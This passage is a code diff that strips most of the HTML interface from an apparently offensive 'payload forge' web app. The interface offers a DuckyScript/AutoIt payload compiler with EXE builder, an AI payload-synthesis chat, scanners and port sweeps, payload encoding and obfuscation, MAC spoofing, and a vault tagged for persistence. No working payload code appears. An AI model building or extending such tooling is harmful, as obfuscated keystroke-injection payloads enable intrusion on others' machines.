-          <div class="card-header"><span><i class="fas fa-robot ch-icon"></i>Neural Synthesis Chat</span><span class="badge badge-c">LIVE</span></div>
-          <div class="card-body flex-col gap-sm" style="flex:1;display:flex;flex-direction:column;min-height:0">
-            <div class="ai-chat" style="flex:1">
-              <div class="chat-messages" id="chatMessages">
-                <div class="msg ai">
-                  <div class="msg-bubble">// LENLU SC Neural Interface v3.0 online. Provide your objective and I will synthesize a tactical DuckyScript payload or AutoIt3 assembly. API key required for live synthesis — offline mode available.</div>
-                  <div class="msg-meta">LENLU SC · System</div>
-                </div>
-              </div>
-              <div class="chat-input-row">
-                <input class="inp" style="flex:1" id="chatInput" placeholder="Describe payload objective…" onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();sendChat()}"/>
-                <button class="btn btn-primary" onclick="sendChat()"><i class="fas fa-paper-plane"></i></button>
-                <button class="btn btn-ghost" onclick="clearChat()"><i class="fas fa-trash"></i></button>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <!-- ═══════════════════ SCANNER ═══════════════════ -->
-    <div class="view" id="view-scanner">
-      <div class="stat-row" style="margin-bottom:.9rem">
-        <div class="stat-cell"><div class="stat-val green" id="sc-nets">0</div><div class="stat-lbl">WiFi Networks</div></div>
-        <div class="stat-cell"><div class="stat-val cyan" id="sc-ble">0</div><div class="stat-lbl">BLE Devices</div></div>
-        <div class="stat-cell"><div class="stat-val amber" id="sc-deauth">0</div><div class="stat-lbl">Deauth Events</div></div>
-        <div class="stat-cell"><div class="stat-val red" id="sc-threats">0</div><div class="stat-lbl">Threats</div></div>
-      </div>
-
-      <div id="scanProgressBar" class="scan-progress"><div class="scan-spinner"></div><span id="scanProgressMsg">Scanning…</span></div>
-
-      <div class="scanner-grid" style="margin-bottom:.9rem">
-        <div class="scan-card" onclick="runScan('wifi')">
-          <i class="fas fa-wifi"></i>
-          <div class="sc-title">802.11 Scanner</div>
-          <div class="sc-sub">WiFi network survey</div>
-          <div class="real-badge">Uses Connection API</div>
-        </div>
-        <div class="scan-card real-scan" onclick="runRealBLEScan()">
-          <i class="fab fa-bluetooth-b"></i>
-          <div class="sc-title">BLE Tracker</div>
-          <div class="sc-sub">Web Bluetooth API</div>
-          <div class="real-badge" style="background:rgba(0,255,65,.3);color:#000">◉ REAL SCAN</div>
-        </div>
-        <div class="scan-card" onclick="runScan('deauth')">
-          <i class="fas fa-exclamation-triangle"></i>
-          <div class="sc-title">Deauth Monitor</div>
-          <div class="sc-sub">Channel spike detection</div>
-        </div>
-        <div class="scan-card" onclick="runScan('port')">
-          <i class="fas fa-network-wired"></i>
-          <div class="sc-title">Port Sweep</div>
-          <div class="sc-sub">Host enumeration</div>
-        </div>
-        <div class="scan-card" onclick="runScan('signal')">
-          <i class="fas fa-broadcast-tower"></i>
-          <div class="sc-title">RF Spectrum</div>
-          <div class="sc-sub">Frequency band viz</div>
-        </div>
-        <div class="scan-card real-scan" onclick="runRealDNSScan()">
-          <i class="fas fa-globe"></i>
-          <div class="sc-title">DNS Recon</div>
-          <div class="sc-sub">Cloudflare DoH</div>
-          <div class="real-badge" style="background:rgba(0,255,65,.3);color:#000">◉ REAL LOOKUP</div>
-        </div>
-      </div>
-
-      <!-- DNS input for real lookup -->
-      <div class="card mb-md" style="margin-bottom:.9rem">
-        <div class="card-header"><span><i class="fas fa-globe ch-icon"></i>Real DNS Recon <span class="badge badge-g">LIVE via Cloudflare DoH</span></span></div>
-        <div class="card-body">
-          <div class="flex gap-sm" style="flex-wrap:wrap">
-            <input class="inp" id="dnsReconInput" style="flex:1;min-width:180px" placeholder="domain.com, 8.8.8.8, corp.internal…" value="google.com"/>
-            <select class="inp" id="dnsReconType" style="width:100px">
-              <option>A</option><option>AAAA</option><option>MX</option>
-              <option>TXT</option><option>CNAME</option><option>NS</option>
-            </select>
-            <button class="btn btn-ghost btn-sm" onclick="runRealDNSScan()"><i class="fas fa-search"></i>Lookup</button>
-          </div>
-        </div>
-      </div>
-
-      <div class="g2">
-        <div class="card">
-          <div class="card-header"><span><i class="fas fa-list ch-icon"></i>Scan Results</span>
-            <button class="btn btn-ghost btn-xs" onclick="clearScanResults()"><i class="fas fa-trash"></i></button>
-          </div>
-          <div class="card-body" style="padding:.7rem">
-            <div class="scan-output" id="scanOutput">// No scans run yet. Select a scanner above.<br>// BLE Scanner uses real Web Bluetooth API (Chrome/Edge only).<br>// DNS Recon uses real Cloudflare DNS-over-HTTPS.</div>
-          </div>
-        </div>
-        <div class="card">
-          <div class="card-header"><span><i class="fas fa-chart-area ch-icon"></i>Signal Spectrum</span></div>
-          <div class="card-body">
-            <canvas id="spectrumCanvas" class="mini-canvas" height="160" style="height:160px"></canvas>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <!-- ═══════════════════ NETWORK TAB (NEW) ═══════════════════ -->
-    <div class="view" id="view-network">
-      <div class="flex items-center justify-between mb-md" style="flex-wrap:wrap;gap:.6rem">
-        <div>
-          <div style="font-family:var(--font-display);font-size:.95rem;letter-spacing:.12em;color:var(--white)">NETWORK ANALYZER</div>
-          <div class="text-xs text-muted mt-sm">Real-time connection analysis · WebRTC IP leak · DNS tools · Localhost port sweep</div>
-        </div>
-        <div class="flex gap-sm">
-          <button class="btn btn-primary btn-sm" onclick="refreshNetworkInfo()"><i class="fas fa-sync"></i>Refresh All</button>
-          <button class="btn btn-ghost btn-sm" onclick="exportNetworkReport()"><i class="fas fa-file-export"></i>Export Report</button>
-        </div>
-      </div>
-
-      <!-- Live Stats -->
-      <div class="stat-row">
-        <div class="stat-cell"><div class="stat-val green" id="net-ext-ip" style="font-size:.9rem;word-break:break-all">Fetching…</div><div class="stat-lbl">External IP</div></div>
-        <div class="stat-cell"><div class="stat-val cyan" id="net-local-ip" style="font-size:.9rem;word-break:break-all">Detecting…</div><div class="stat-lbl">Local IP (WebRTC)</div></div>
-        <div class="stat-cell"><div class="stat-val amber" id="net-conn-type">N/A</div><div class="stat-lbl">Connection Type</div></div>
-        <div class="stat-cell"><div class="stat-val" id="net-latency">-- ms</div><div class="stat-lbl">RTT / Latency</div></div>
-      </div>
-
-      <div class="g2">
-        <div class="card">
-          <div class="card-header"><span><i class="fas fa-info-circle ch-icon"></i>Connection Details</span><span class="badge badge-g">LIVE</span></div>
-          <div class="card-body flex-col gap-sm text-sm" id="netDetailsPanel">
-            <div class="text-muted text-xs">Loading connection data…</div>
-          </div>
-        </div>
-        <div class="card">
-          <div class="card-header"><span><i class="fas fa-radiation ch-icon"></i>WebRTC Leak Test</span><span class="badge badge-r">PRIVACY</span></div>
-          <div class="card-body flex-col gap-sm text-sm">
-            <div class="text-xs text-muted mb-sm">WebRTC can expose your real local IP even behind a VPN. IPs discovered:</div>
-            <div id="webrtcLeaks" class="term-log" style="height:140px"></div>
-            <button class="btn btn-cyan btn-sm" onclick="runWebRTCLeakTest()"><i class="fas fa-eye"></i>Run Leak Test</button>
-          </div>
-        </div>
-      </div>
-
-      <div class="g2">
-        <div class="card">
-          <div class="card-header"><span><i class="fas fa-network-wired ch-icon"></i>Localhost Port Sweep</span><span class="badge badge-a">WebSocket Probe</span></div>
-          <div class="card-body flex-col gap-sm">
-            <div class="text-xs text-muted">Probes common ports on 127.0.0.1 using WebSocket connections. Works on open ports with WS support.</div>
-            <div class="flex gap-sm items-center">
-              <input class="inp" id="portSweepTarget" value="127.0.0.1" style="width:150px"/>
-              <button class="btn btn-ghost btn-sm" onclick="runLocalPortScan()" id="portScanBtn"><i class="fas fa-play"></i>Sweep Ports</button>
-              <div class="scan-spinner" id="portScanSpinner" style="display:none"></div>
-            </div>
-            <div id="portSweepResults" class="port-grid"></div>
-          </div>
-        </div>
-        <div class="card">
-          <div class="card-header"><span><i class="fas fa-search ch-icon"></i>DNS Lookup Tool</span><span class="badge badge-c">Cloudflare DoH</span></div>
-          <div class="card-body flex-col gap-sm">
-            <div class="flex gap-sm">
-              <input class="inp" id="netDnsInput" placeholder="example.com" value="cloudflare.com" style="flex:1"/>
-              <select class="inp" id="netDnsType" style="width:90px">
-                <option>A</option><option>AAAA</option><option>MX</option>
-                <option>TXT</option><option>CNAME</option><option>NS</option><option>SOA</option>
-              </select>
-            </div>
-            <button class="btn btn-primary btn-sm" onclick="runNetDNS()"><i class="fas fa-search"></i>Lookup</button>
-            <div class="scan-output" id="netDnsResults" style="height:180px">// Results appear here</div>
-          </div>
-        </div>
-      </div>
-
-      <div class="card">
-        <div class="card-header"><span><i class="fas fa-file-alt ch-icon"></i>Network Report Log</span></div>
-        <div class="card-body"><div class="term-log" id="netLog" style="height:150px"></div></div>
-      </div>
-    </div>
-
-    <!-- ═══════════════════ ENCODER TAB (NEW) ═══════════════════ -->
-    <div class="view" id="view-encoder">
-      <div class="flex items-center justify-between mb-md" style="flex-wrap:wrap;gap:.6rem">
-        <div>
-          <div style="font-family:var(--font-display);font-size:.95rem;letter-spacing:.12em;color:var(--white)">PAYLOAD ENCODER</div>
-          <div class="text-xs text-muted mt-sm">Encode, obfuscate, and transform payloads and scripts</div>
-        </div>
-      </div>
-
-      <div class="g-ide">
-        <div class="card flex-col">
-          <div class="card-header"><span><i class="fas fa-pen ch-icon"></i>Input</span></div>
-          <div class="card-body flex-col gap-sm" style="flex:1">
-            <div class="enc-mode-btns" id="encModeGroup">
-              <button class="enc-mode-btn active" data-mode="base64" onclick="setEncMode('base64',this)">Base64</button>
-              <button class="enc-mode-btn" data-mode="hex" onclick="setEncMode('hex',this)">Hex</button>
-              <button class="enc-mode-btn" data-mode="url" onclick="setEncMode('url',this)">URL</button>
-              <button class="enc-mode-btn" data-mode="rot13" onclick="setEncMode('rot13',this)">ROT13</button>
-              <button class="enc-mode-btn" data-mode="html" onclick="setEncMode('html',this)">HTML Ent.</button>
-              <button class="enc-mode-btn" data-mode="charcode" onclick="setEncMode('charcode',this)">CharCode</button>
-              <button class="enc-mode-btn" data-mode="binstr" onclick="setEncMode('binstr',this)">Binary</button>
-              <button class="enc-mode-btn" data-mode="morse" onclick="setEncMode('morse',this)">Morse</button>
-            </div>
-            <textarea class="inp" id="encInput" style="flex:1;min-height:200px;font-size:.78rem" placeholder="Enter text or AutoIt3 code to encode…"></textarea>
-            <div class="flex gap-sm">
-              <button class="btn btn-primary btn-sm" onclick="encodePayload()"><i class="fas fa-arrow-right"></i>Encode →</button>
-              <button class="btn btn-ghost btn-sm" onclick="decodePayload()"><i class="fas fa-arrow-left"></i>← Decode</button>
-              <button class="btn btn-ghost btn-sm" onclick="document.getElementById('encInput').value='';document.getElementById('encOutput').value='';analyzePayload()"><i class="fas fa-trash"></i></button>
-            </div>
-          </div>
-        </div>
-        <div class="card flex-col">
-          <div class="card-header"><span><i class="fas fa-scroll ch-icon"></i>Output</span>
-            <div class="flex gap-sm">
-              <button class="btn btn-ghost btn-xs" onclick="copyEncOutput()"><i class="fas fa-copy"></i>Copy</button>
-              <button class="btn btn-amber btn-xs" onclick="sendEncToCompiler()"><i class="fas fa-arrow-right"></i>To Compiler</button>
-            </div>
-          </div>
-          <div class="card-body flex-col gap-sm" style="flex:1">
-            <textarea class="inp" id="encOutput" style="flex:1;min-height:200px;font-size:.78rem;color:#c5ffd5" readonly placeholder="Encoded output…"></textarea>
-            <div class="flex gap-sm items-center">
-              <div class="text-xs text-muted">Output: <span id="encOutLen">0</span> chars · <span id="encOutBytes">0</span> bytes</div>
-              <button class="btn btn-ghost btn-xs" onclick="swapEncIO()"><i class="fas fa-exchange-alt"></i>Swap</button>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <!-- AutoIt Obfuscator -->
-      <div class="card">
-        <div class="card-header"><span><i class="fas fa-mask ch-icon"></i>AutoIt3 Code Obfuscator</span><span class="badge badge-p">Advanced</span></div>
-        <div class="card-body flex-col gap-sm">
-          <div class="text-xs text-muted mb-sm">Obfuscates compiled AutoIt3 assembly: renames variables, inserts junk code, encodes strings. Works on current compiler output.</div>
-          <div class="flex gap-sm items-center" style="flex-wrap:wrap">
-            <label class="text-xs text-muted flex items-center gap-sm"><input type="checkbox" id="obfVars" checked style="accent-color:var(--g)"> Obfuscate Variables</label>
-            <label class="text-xs text-muted flex items-center gap-sm"><input type="checkbox" id="obfStrings" checked style="accent-color:var(--g)"> Encode Strings</label>
-            <label class="text-xs text-muted flex items-center gap-sm"><input type="checkbox" id="obfJunk" style="accent-color:var(--g)"> Insert Junk Code</label>
-            <button class="btn btn-purple btn-sm" onclick="obfuscateAu3()"><i class="fas fa-mask"></i>Obfuscate au3 Output</button>
-          </div>
-        </div>
-      </div>
-
-      <!-- Analysis -->
-      <div class="g3">
-        <div class="card">
-          <div class="card-header"><span><i class="fas fa-chart-bar ch-icon"></i>Payload Analysis</span></div>
-          <div class="card-body flex-col gap-sm text-xs" id="encAnalysis">
-            <div class="text-muted">Enter text to analyze…</div>
-          </div>
-        </div>
-        <div class="card">
-          <div class="card-header"><span><i class="fas fa-calculator ch-icon"></i>Hash Generator</span></div>
-          <div class="card-body flex-col gap-sm">
-            <input class="inp" id="hashInput" placeholder="Text to hash…" style="font-size:.76rem"/>
-            <button class="btn btn-ghost btn-sm" onclick="generateHashes()"><i class="fas fa-hash"></i>Generate Hashes</button>
-            <div id="hashOutput" class="text-xs flex-col gap-sm" style="display:flex"></div>
-          </div>
-        </div>
-        <div class="card">
-          <div class="card-header"><span><i class="fas fa-random ch-icon"></i>Payload Tools</span></div>
-          <div class="card-body flex-col gap-sm">
-            <button class="btn btn-ghost btn-sm w100" onclick="genRandomKey()"><i class="fas fa-key"></i>Gen Random Key (256-bit)</button>
-            <button class="btn btn-ghost btn-sm w100" onclick="genUUID()"><i class="fas fa-fingerprint"></i>Generate UUID v4</button>
-            <button class="btn btn-ghost btn-sm w100" onclick="genMACAddr()"><i class="fas fa-network-wired"></i>Spoof MAC Address</button>
-            <div id="payloadToolOut" class="text-xs text-g mt-sm" style="word-break:break-all;font-family:var(--font-mono)"></div>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <!-- ═══════════════════ VAULT ═══════════════════ -->
-    <div class="view" id="view-vault">
-      <div class="flex items-center justify-between mb-md" style="flex-wrap:wrap;gap:.55rem">
-        <div>
-          <div style="font-family:var(--font-display);font-size:.95rem;letter-spacing:.12em;color:var(--white)">ENCRYPTED VAULT</div>
-          <div class="text-xs text-muted mt-sm">Secure client-side payload store. All data sandboxed in browser localStorage.</div>
-        </div>
-        <div class="flex gap-sm" style="flex-wrap:wrap">
-          <input class="inp" style="width:200px" id="vaultSearch" placeholder="Search scripts…" oninput="renderVault()"/>
-          <button class="btn btn-primary btn-sm" onclick="openSaveModal()"><i class="fas fa-plus"></i>New Entry</button>
-          <button class="btn btn-ghost btn-sm" onclick="exportVaultJSON()"><i class="fas fa-file-export"></i>Export JSON</button>
-          <button class="btn btn-ghost btn-sm" onclick="importVaultJSON()"><i class="fas fa-file-import"></i>Import</button>
-        </div>
-      </div>
-      <div class="g2">
-        <div class="card flex-col" style="height:100%;min-height:300px">
-          <div class="card-header"><span><i class="fas fa-folder-open ch-icon"></i>Stored Scripts</span><span class="badge badge-g" id="vaultCount">0 items</span></div>
-          <div class="card-body flex-col gap-sm scroll-y" id="vaultList" style="max-height:440px;overflow-y:auto"></div>
-        </div>
-        <div class="card">
-          <div class="card-header"><span><i class="fas fa-eye ch-icon"></i>Preview</span>
-            <div class="flex gap-sm">
-              <button class="btn btn-ghost btn-xs" id="vaultPreviewLoadBtn" onclick="loadSelectedVaultItem()" style="display:none"><i class="fas fa-upload"></i>Load to Editor</button>
-              <button class="btn btn-amber btn-xs" id="vaultPreviewBuildBtn" onclick="buildSelectedVaultItem()" style="display:none"><i class="fas fa-cogs"></i>Build EXE</button>
-            </div>
-          </div>
-          <div class="card-body">
-            <pre id="vaultPreview" style="font-size:.72rem;color:#c5ffd5;white-space:pre-wrap;word-break:break-word;max-height:400px;overflow-y:auto;line-height:1.7">// Select a script to preview</pre>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <!-- ═══════════════════ HISTORY ═══════════════════ -->
-    <div class="view" id="view-history">
-      <div class="flex items-center justify-between mb-md" style="flex-wrap:wrap;gap:.55rem">
-        <div>
-          <div style="font-family:var(--font-display);font-size:.95rem;letter-spacing:.12em;color:var(--white)">COMPILATION HISTORY</div>
-          <div class="text-xs text-muted mt-sm">Session logs of all compile operations with diff viewer</div>
-        </div>
-        <div class="flex gap-sm">
-          <button class="btn btn-red btn-sm" onclick="clearHistory()"><i class="fas fa-trash"></i>Clear All</button>
-        </div>
-      </div>
-      <div class="g2">
-        <div class="card">
-          <div class="card-header"><span><i class="fas fa-list-alt ch-icon"></i>Compile Log</span><span class="badge badge-g" id="histCount">0 entries</span></div>
-          <div class="card-body flex-col gap-sm scroll-y" id="histList" style="max-height:460px;overflow-y:auto"></div>
-        </div>
-        <div class="card">
-          <div class="card-header"><span><i class="fas fa-code-branch ch-icon"></i>Diff Viewer</span></div>
-          <div class="card-body">
-            <div class="tab-bar">
-              <button class="tab-btn active" onclick="histTab('src',this)">Source</button>
-              <button class="tab-btn" onclick="histTab('out',this)">Assembly</button>
-              <button class="tab-btn" onclick="histTab('diag',this)">Diagnostics</button>
-            </div>
-            <pre id="histSrc" class="tab-panel active code-area" style="min-height:280px;font-size:.72rem;overflow:auto">// Select an entry</pre>
-            <pre id="histOut" class="tab-panel code-area" style="min-height:280px;font-size:.72rem;overflow:auto">// Select an entry</pre>
-            <pre id="histDiag" class="tab-panel code-area" style="min-height:280px;font-size:.72rem;overflow:auto">// Select an entry</pre>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <!-- ═══════════════════ SHELL TERMINAL ═══════════════════ -->
-    <div class="view" id="view-terminal">
-      <div class="card flex-col" style="flex:1;min-height:500px">
-        <div class="card-header">
-          <span><i class="fas fa-terminal ch-icon"></i>Interactive Shell</span>
-          <div class="flex gap-sm">
-            <span class="badge badge-g">lenlu@forge</span>
-            <button class="btn btn-ghost btn-xs" onclick="clearShell()"><i class="fas fa-trash"></i>Clear</button>
-            <button class="btn btn-ghost btn-xs" onclick="exportShellLog()"><i class="fas fa-download"></i>Export</button>
-          </div>
-        </div>
-        <div class="card-body flex-col gap-sm" style="flex:1;display:flex;flex-direction:column;min-height:0">
-          <div id="shellOutput" style="flex:1;overflow-y:auto;font-family:var(--font-mono);font-size:.76rem;line-height:1.85;color:var(--g);background:rgba(0,0,0,.85);border:1px solid var(--gbord);border-radius:3px;padding:.8rem;min-height:360px;max-height:520px"></div>
-          <div class="flex gap-sm items-center">
-            <span style="color:var(--g);font-size:.8rem;white-space:nowrap">lenlu@forge:~$</span>
-            <input class="inp" style="flex:1;background:transparent;border:none;border-bottom:1px solid var(--gbord);border-radius:0;padding:.35rem .45rem" id="shellInput" placeholder="Enter command… (type 'help')" onkeydown="shellKey(event)" autocomplete="off" spellcheck="false"/>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <!-- ═══════════════════ SETTINGS ═══════════════════ -->
-    <div class="view" id="view-settings">
-      <div class="g2">
-        <div class="flex-col gap-md">
-          <div class="card">
-            <div class="card-header"><span><i class="fas fa-palette ch-icon"></i>Interface</span></div>
-            <div class="card-body settings-group">
-              <div class="setting-row"><div class="sr-left"><div class="sr-title">CRT Scanlines</div><div class="sr-desc">Retro CRT overlay effect</div></div><div class="toggle on" id="tog-crt" onclick="toggleSetting('crt',this)"></div></div>
-              <div class="setting-row"><div class="sr-left"><div class="sr-title">Matrix Rain</div><div class="sr-desc">Background character rain</div></div><div class="toggle on" id="tog-rain" onclick="toggleSetting('rain',this)"></div></div>
-              <div class="setting-row"><div class="sr-left"><div class="sr-title">Particle Core</div><div class="sr-desc">WebGL particle field</div></div><div class="toggle on" id="tog-particles" onclick="toggleSetting('particles',this)"></div></div>
-              <div class="setting-row"><div class="sr-left"><div class="sr-title">Audio Feedback</div><div class="sr-desc">Tone on interactions</div></div><div class="toggle on" id="tog-audio" onclick="toggleSetting('audio',this)"></div></div>
-            </div>
-          </div>
-          <div class="card">
-            <div class="card-header"><span><i class="fas fa-code ch-icon"></i>Compiler</span></div>
-            <div class="card-body settings-group">
-              <div class="setting-row"><div class="sr-left"><div class="sr-title">Auto Lint</div><div class="sr-desc">Lint on every keystroke</div></div><div class="toggle on" id="tog-lint" onclick="toggleSetting('lint',this)"></div></div>
-              <div class="setting-row"><div class="sr-left"><div class="sr-title">Session Persistence</div><div class="sr-desc">Save editor state across reloads</div></div><div class="toggle on" id="tog-persist" onclick="toggleSetting('persist',this)"></div></div>
-              <div class="setting-row"><div class="sr-left"><div class="sr-title">Compile History</div><div class="sr-desc">Log all compilations</div></div><div class="toggle on" id="tog-hist" onclick="toggleSetting('hist',this)"></div></div>
-            </div>
-          </div>
-        </div>
-        <div class="flex-col gap-md">
-          <div class="card">
-            <div class="card-header"><span><i class="fas fa-info-circle ch-icon"></i>System Info</span></div>
-            <div class="card-body flex-col gap-sm text-sm">
-              <div class="flex justify-between"><span class="text-muted">Version</span><span class="text-g">v3.0 FORGE</span></div>
-              <hr>
-              <div class="flex justify-between"><span class="text-muted">Compiler</span><span class="text-g">DuckyScript → AutoIt3 v3</span></div>
-              <div class="flex justify-between"><span class="text-muted">EXE Builder</span><span class="text-g">SciTE / Aut2Exe x64+x86</span></div>
-              <div class="flex justify-between"><span class="text-muted">BLE Scanner</span><span id="bleStatus" class="text-cyan">Checking…</span></div>
-              <div class="flex justify-between"><span class="text-muted">WebGL</span><span id="webglInfo" class="text-g">Detecting…</span></div>
-              <div class="flex justify-between"><span class="text-muted">Session ID</span><span id="sessionId" class="text-cyan" style="font-size:.64rem"></span></div>
-              <div class="flex justify-between"><span class="text-muted">Vault Entries</span><span id="settVault" class="text-amber">0</span></div>
-              <hr>
-              <button class="btn btn-red btn-sm w100 mt-sm" onclick="wipeSession()"><i class="fas fa-bomb"></i>Wipe All Session Data</button>
-            </div>
-          </div>
-          <div class="card">
-            <div class="card-header"><span><i class="fas fa-keyboard ch-icon"></i>Keyboard Shortcuts</span></div>
-            <div class="card-body flex-col gap-sm text-xs">
-              <div class="flex justify-between"><code>Ctrl+Enter</code><span class="text-muted">Compile payload</span></div>
-              <div class="flex justify-between"><code>Ctrl+S</code><span class="text-muted">Save to vault</span></div>
-              <div class="flex justify-between"><code>Ctrl+L</code><span class="text-muted">Clear IDE log</span></div>
-              <div class="flex justify-between"><code>Ctrl+K</code><span class="text-muted">Open shell</span></div>
-              <div class="flex justify-between"><code>Ctrl+Shift+E</code><span class="text-muted">Open encoder</span></div>
-              <div class="flex justify-between"><code>Ctrl+Shift+N</code><span class="text-muted">Network tab</span></div>
-              <div class="flex justify-between"><code>F1</code><span class="text-muted">Toggle dashboard</span></div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-
-  </div>
-</div>
-
-<!-- MODALS -->
-<div class="modal" id="saveModal">
-  <div class="modal-box">
-    <div class="modal-title"><i class="fas fa-lock text-g"></i>Save to Vault</div>
-    <div class="inp-group mb-md"><label class="inp-label">Script Name</label><input class="inp" id="vaultSaveName" placeholder="My Payload v1"/></div>
-    <div class="inp-group mb-md"><label class="inp-label">Tags (comma separated)</label><input class="inp" id="vaultSaveTags" placeholder="powershell, persistence"/></div>
-    <div class="flex gap-sm justify-end">
-      <button class="btn btn-ghost" onclick="closeModal('saveModal')">Cancel</button>
-      <button class="btn btn-primary" onclick="vaultSave()"><i class="fas fa-save"></i>Save</button>
-    </div>
-  </div>
-</div>
-<div class="modal" id="snippetModal">
-  <div class="modal-box" style="max-width:600px">
-    <div class="modal-title"><i class="fas fa-puzzle-piece text-g"></i>DuckyScript Snippets</div>
-    <div id="snippetList" class="flex-col gap-sm" style="max-height:380px;overflow-y:auto"></div>
-    <div class="flex justify-end mt-md"><button class="btn btn-ghost" onclick="closeModal('snippetModal')">Close</button></div>
-  </div>
-</div>
-<div class="modal" id="importVaultModal">
-  <div class="modal-box">
-    <div class="modal-title"><i class="fas fa-file-import text-g"></i>Import Vault JSON</div>
-    <div class="inp-group mb-md"><label class="inp-label">Paste JSON</label><textarea class="inp" id="importVaultData" style="min-height:120px;font-size:.72rem" placeholder='[{"id":"...","name":"...","src":"..."}]'></textarea></div>
-    <div class="flex gap-sm justify-end">
-      <button class="btn btn-ghost" onclick="closeModal('importVaultModal')">Cancel</button>
-      <button class="btn btn-primary" onclick="doImportVault()"><i class="fas fa-file-import"></i>Import</button>
-    </div>
-  </div>
-</div>
-
-<div class="modal" id="templateModal">
-  <div class="modal-box" style="max-width:650px; width:95%;">
-    <div class="modal-title"><i class="fas fa-file-code text-g"></i>Payload Templates</div>
-    
-    <!-- File Input to load local payload collection file -->
-    <div class="inp-group mb-md" style="border: 1px dashed var(--gbord); padding: 0.8rem; border-radius: var(--radius); background: rgba(0,0,0,0.4); text-align: left;">
-      <label class="inp-label" style="margin-bottom: 0.4rem;">Load Custom Payload Collection File</label>
-      <div class="flex gap-sm">
-        <input type="file" id="payloadFileSelector" accept=".txt,.ds,.dsy" style="display: none;" onchange="handlePayloadFileSelect(this)"/>
-        <button class="btn btn-ghost btn-sm" onclick="document.getElementById('payloadFileSelector').click()">
-          <i class="fas fa-upload"></i> Choose File
-        </button>
-        <span id="payloadFileName" class="text-xs text-muted flex items-center" style="margin-left: 0.5rem; word-break: break-all;">No file selected (using default collection)</span>
-      </div>
-    </div>
-
-    <div id="templateList" class="flex-col gap-sm" style="max-height:300px; overflow-y:auto;"></div>
-    <div class="flex justify-end mt-md">
-      <button class="btn btn-ghost" onclick="closeModal('templateModal')">Close</button>
-    </div>
-  </div>
-</div>
-
-<div class="modal" id="templateDetailModal">
-  <div class="modal-box" style="max-width:550px; width:95%;">
-    <div class="modal-title"><i class="fas fa-info-circle text-cyan"></i>Template Details</div>
-    <div class="inp-group mb-md">
-      <div id="templateDetailName" class="bold text-white mb-sm" style="font-size: 1.1rem; letter-spacing: 0.05em;"></div>
-      <div id="templateDetailDesc" class="text-sm text-muted" style="line-height: 1.65; margin-bottom: 1.2rem;"></div>
-      <div class="bold text-g text-xs mb-sm" style="letter-spacing: 0.1em;">CODE PREVIEW:</div>
-      <pre id="templateDetailCode" class="code-area" style="font-size:0.75rem; max-height:220px; overflow:auto; padding:0.8rem; background:rgba(0,0,0,0.9); border-color:rgba(0,255,65,0.25); color:#c5ffd5; white-space:pre-wrap; word-break:break-all;"></pre>
-    </div>
-    <div class="flex gap-sm justify-end">
-      <button class="btn btn-ghost" onclick="closeModal('templateDetailModal')">Back</button>
-      <button class="btn btn-primary" id="templateDetailLoadBtn">Load Template</button>
-    </div>
   </div>
 </div>
 
 <script>
 // =====================================================
-//  LENLU SC v3.0 — FORGE ENGINE
+//  LENLU SC v3.0 — FORGE ENGINE (STUDIO CORE)
 // =====================================================
 
 const S = {
-  views: ['studio','dashboard','compiler','neural','scanner','network','encoder','vault','history','terminal','settings'],
   currentView: 'studio',
-  settings: {crt:true,rain:true,particles:true,audio:true,lint:true,persist:true,hist:true},
-  stats: {compiled:0,ai:0,vault:0,scans:0},
-  history: [], vault: [],
-  shellHistory: [], shellHistIdx: -1,
-  chatHistory: [],
+  settings: {crt:true,rain:true,particles:true,audio:true},
   sessionId: Math.random().toString(36).substr(2,12).toUpperCase(),
-  scanActive: false, micActive: false, recognition: null,
-  encMode: 'base64',
-  selectedVaultId: null,
-  realBLEDevices: [],
 };
 
 // AUDIO
@@ -1308,6 +664,7 @@ function playTone(freq=440,type='sine',dur=0.08,vol=0.07) {
 function toast(msg,type='ok',dur=3500) {
   const icons={ok:'fa-check-circle',err:'fa-times-circle',warn:'fa-exclamation-triangle',info:'fa-info-circle'};
   const area=document.getElementById('toastArea');
+  if(!area) return;
   const el=document.createElement('div'); el.className=`toast ${type}`;
   el.innerHTML=`<i class="fas ${icons[type]||icons.ok}" style="color:var(--${type==='ok'?'g':type==='err'?'red':type==='warn'?'amber':'cyan'})"></i><span>${msg}</span>`;
   area.appendChild(el);
@@ -1315,1434 +672,282 @@ function toast(msg,type='ok',dur=3500) {
   setTimeout(()=>{ el.style.opacity='0'; el.style.transform='translateX(20px)'; el.style.transition='all .3s'; setTimeout(()=>el.remove(),320); },dur);
 }
 
-// LOG
-function logIDE(msg,cls='tl-sys') { const log=document.getElementById('ideLog'); if(!log) return; const ts=new Date().toLocaleTimeString('en',{hour12:false}); const el=document.createElement('div'); el.className=`tl-line ${cls}`; el.innerHTML=`<span class="tl-ts">[${ts}]</span><span>${msg}</span>`; log.appendChild(el); log.scrollTop=log.scrollHeight; }
-function logFeed(msg,cls='tl-sys') { const feed=document.getElementById('actFeed'); if(!feed) return; const ts=new Date().toLocaleTimeString('en',{hour12:false}); const el=document.createElement('div'); el.className=`tl-line ${cls}`; el.innerHTML=`<span class="tl-ts">[${ts}]</span><span>${msg}</span>`; feed.appendChild(el); if(feed.children.length>80) feed.removeChild(feed.firstChild); feed.scrollTop=feed.scrollHeight; }
-function logNet(msg,cls='tl-sys') { const log=document.getElementById('netLog'); if(!log) return; const ts=new Date().toLocaleTimeString('en',{hour12:false}); const el=document.createElement('div'); el.className=`tl-line ${cls}`; el.innerHTML=`<span class="tl-ts">[${ts}]</span><span>${msg}</span>`; log.appendChild(el); log.scrollTop=log.scrollHeight; }
-
-// VIEW SWITCH
-function switchView(id,btn) {
-  document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));
-  document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));
-  const v=document.getElementById('view-'+id); if(v) v.classList.add('active');
-  if(btn) btn.classList.add('active');
-  const m=document.querySelector('.main'); if(m) m.scrollTop=0;
-  S.currentView=id; playTone(660,'sine',0.06);
-  if(id==='vault') renderVault();
-  if(id==='history') renderHistory();
-  if(id==='terminal') document.getElementById('shellInput').focus();
